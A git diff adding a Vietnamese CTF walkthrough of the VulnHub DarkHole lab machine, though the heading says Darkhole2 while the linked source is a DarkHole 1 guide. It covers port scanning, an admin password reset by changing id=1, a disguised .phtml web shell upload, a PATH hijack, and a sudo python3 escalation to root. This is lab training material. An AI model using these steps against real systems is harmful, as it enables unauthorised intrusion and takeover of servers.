@@ -372,6 +372,91 @@ Nguồn hướng dẫn: [Đây](https://www.hackingarticles.in/darkhole-2-vulnhu
 
 ## IV. Darkhole2
 
+Nguồn hướng dẫn:[Đây](https://resources.infosecinstitute.com/topic/darkhole-1-vulnhub-ctf-walkthrough/)
+
+1. Tìm kiếm mục tiêu, quét cổng
+
+   Đầu tiên dùng netdiscover tool để khám phá mạng xung quanh, tìm địa chỉ IP mục tiêu:
+   `netdiscover`
+   
+   Sau khi đã có IP máy mục tiêu, quét các cổng bằng Nmap tool:
+   
+   `nmap -sV -p- 192.168.1.4`
+
+   ![image](https://github.com/tninh27/Lab/assets/105789492/4ec60209-f825-496f-b694-0b6ab7f1cadc)
+
+   - Ta có: 22 ssh, 80 web
+
+2. Liệt kê
+
+   Dùng công cụ dirbuster xem các thư mục,sau đó xem bằng trình duyệt:
+
+   ![image](https://github.com/tninh27/Lab/assets/105789492/655e4482-7bcf-4229-9415-c4deb776f9b2)
+
+   Đăng ký tài khoản, và đăng nhập:
+
+   ![image](https://github.com/tninh27/Lab/assets/105789492/0f894096-e307-490d-9f4b-b414dd1cd67f)
+
+3. Khai thác
+
+   Dùng burp suite chặn bắt và thử thay đổi mật khẩu với id=1 (id admin)
+
+   ![image](https://github.com/tninh27/Lab/assets/105789492/95d42239-7a46-476a-9122-6267960ca07c)
+
+   Đổi thành công mật khẩu tài khoản admin, tiến hành đăng nhập tài khoản admin:
+
+   ![image](https://github.com/tninh27/Lab/assets/105789492/746372bc-c851-4a90-8b02-390f767223e6)
+
+   - Tại đây thấy tính năng upload file ảnh
+   
+   Tạo 1 file php_shell với đuôi tệp .phtml nhằm đánh lừa và upload lên web:
+
+   ![image](https://github.com/tninh27/Lab/assets/105789492/efd04f61-2132-4948-9c3f-32440418fdd9)
+
+   Nghe cổng vừa tạo trong file shell:
+
+   ![image](https://github.com/tninh27/Lab/assets/105789492/9a095511-85c0-488f-928c-71312d5d9838)
+
+   Sau khi có shell, chạy lệnh:
+
+   `python3 -c ‘import pty;pty.spawn(“/bin/bash”)’`
+
+   ![image](https://github.com/tninh27/Lab/assets/105789492/f63f9444-e603-4a63-a935-27fc346ca4d1)
+
+   Xem các tệp người dùng John thấy có file toto có thể chạy với quyền root:
+
+   `cd /tmp`
+   `echo “/bin/bash” > id`
+   `chmod +x id`
+   `export PATH=/tmp:$PATH`
+   `which id`
+
+   Chạy file toto:
+
+   ![image](https://github.com/tninh27/Lab/assets/105789492/59744b3c-1642-461e-baf9-eb079ab72928)
+
+   Đăng nhập thành công John, xem file password:
+
+   ![image](https://github.com/tninh27/Lab/assets/105789492/d148e7ff-c41a-42a3-8a2d-440bd54b0872)
+
+4. Leo thang đặc quyền
+
+   Đăng nhập với password vừa tìm được : `sudo –l`
+
+   ![image](https://github.com/tninh27/Lab/assets/105789492/810ca1ae-452b-48c2-a75a-01fda9729b09)
+
+   Chạy lệnh khai thác:
+
+   `echo ‘import os;os.system(“/bin/bash”)’ > file.py`
+   `sudo /usr/bin/python3 /home/john/file.py`
+   `id`
+
+   ![image](https://github.com/tninh27/Lab/assets/105789492/1c4475bd-8bd0-468e-b8de-475896816214)
+
+   Đã đăng nhập root, xem file root.txt:
+
+   ![image](https://github.com/tninh27/Lab/assets/105789492/257bb341-e5fd-4c93-995b-783ffadd84fb)
+
 ## V. Prime1
 
 
